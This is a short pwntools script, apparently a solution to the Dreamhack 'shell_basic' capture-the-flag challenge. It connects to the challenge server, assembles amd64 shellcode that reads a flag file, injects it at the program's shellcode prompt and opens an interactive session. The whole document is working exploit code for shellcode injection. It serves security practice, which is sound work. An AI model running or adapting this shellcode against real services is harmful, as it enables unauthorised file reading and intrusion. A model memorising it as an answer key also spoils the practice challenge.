from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./shell_basic")
p = remote("host3.dreamhack.games", 9009)

context(arch='amd64', os='linux')
sh = pwnlib.shellcraft.cat("/home/shell_basic/flag_name_is_loooooong", fd=1)


p.sendlineafter("shellcode: ", asm(sh))
p.recvline()
p.interactive()
